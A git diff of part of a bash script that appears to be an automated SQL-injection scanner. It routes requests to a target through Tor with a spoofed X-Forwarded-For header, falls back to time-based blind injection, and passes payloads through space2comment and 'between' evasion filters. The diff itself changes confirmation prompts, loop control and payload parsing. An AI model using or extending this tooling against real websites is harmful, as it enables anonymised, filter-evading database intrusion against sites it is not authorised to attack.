@@ -26,19 +26,23 @@ if [ ! -f "$Cupcake_pie" ] || [ ! -f "$Strawberry_pudding" ] || [ ! -f "$Choco_m
 fi
 
 if [ -s "$ROOT_LOG_FILE" ]; then
-    echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Target.log already contains previous scan data or you just input something on it."
-    read -p "$(echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Continuing will overwrite and wipe the old log file. Proceed? (y/n): ")" confirm_overwrite
+    if [ "$skip_confirm" = "true" ]; then
+        > "$ROOT_LOG_FILE"
+    else
+        echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Target.log already contains previous scan data or you just input something on it."
+        read -p "$(echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Continuing will overwrite and wipe the old log file. Proceed? (y/n): ")" confirm_overwrite
 
-    case "$confirm_overwrite" in
-        [Yy]* )
-            > "$ROOT_LOG_FILE"
-            echo -e "[i] Target.log cleared. You can continue now\n"
-            ;;
-        * )
-            echo -e "\n\e[0;33m[\e[0m-\e[0;33m]\e[0m Cancelled. You cant continue if your log is not empty."
-            exit 0
-            ;;
-    esac
+        case "$confirm_overwrite" in
+            [Yy]* )
+                > "$ROOT_LOG_FILE"
+                echo -e "[i] Target.log cleared. You can continue now\n"
+                ;;
+            * )
+                echo -e "\n\e[0;33m[\e[0m-\e[0;33m]\e[0m Cancelled. You cant continue if your log is not empty."
+                exit 0
+                ;;
+        esac
+    fi
 else
     > "$ROOT_LOG_FILE"
 fi
@@ -60,7 +64,7 @@ time_audit_engine() {
     local tangyuan="$1"
     local mooncake="$2"
     echo -e "\e[0;33m[\e[0m!\e[0;34m+]\e[0m Auditing Latency: $target_url$tangyuan$mooncake"
-    
+
     local stopwatch_seconds=$(curl --socks5-hostname 127.0.0.1:9050 -m 15 -A "Mozilla/5.0" -H "X-Forwarded-For: 127.0.0.1" -s -o /dev/null -w "%{time_total}" "$target_url$tangyuan$mooncake")
 
     if (( $(echo "$stopwatch_seconds > 4.0" | bc -l) )); then
@@ -102,9 +106,20 @@ while IFS= read -r target_word || [ -n "$target_word" ]; do
     [[ -z "$target_word" || "$target_word" =~ ^# ]] && continue
     if Chicken "$target_word"; then
         risk_stage_success="true"
+        # INTEGRASI FLAG -str=risk: Jika store_mode MATI (false), langsung hentikan loop pemindaian file saat sukses ketemu 200 OK
+        if [ "$store_mode" = "false" ]; then
+            break
+        fi
     fi
     sleep $((4 + RANDOM % 5))
 done < <(shuf "$Cupcake_pie")
+
+#Oh man, he told me to buy an egg.
+if [ "$store_mode" = "true" ] && echo "FOUND_200" | grep -qE "FOUND_200"; then
+    if [ -s "$ROOT_LOG_FILE" ]; then
+        risk_stage_success="true"
+    fi
+fi
 
 if [ "$risk_stage_success" = "false" ]; then
     echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Stage 1 failed to acquire 200 OK. Escalating to Time based."
@@ -116,7 +131,7 @@ if [ "$risk_stage_success" = "false" ]; then
         [[ -z "$sqli_payload" || "$sqli_payload" =~ ^# ]] && continue
 
         tangyuan=$(echo "$sqli_payload" | cut -d'|' -f1)
-mooncake=$(echo "$sqli_payload" | cut -d'|' -f2)
+        mooncake=$(echo "$sqli_payload" | cut -d'|' -f2-)
 
         lapis_satu=$(space2comment_engine "$mooncake") #Lol, i like lapis. Lapis is not that blu blu thing. Ah yk yk.
         lapis_dua=$(between_engine "$lapis_satu") #Im proud eating lapis.
@@ -170,3 +185,4 @@ case "$player_want" in
         echo -e "\n\e[0;33m[!]\e[0m Post validation skipped. Raw outputs kept inside Target.log file. You can see it if you want tho."
         ;;
 esac
+
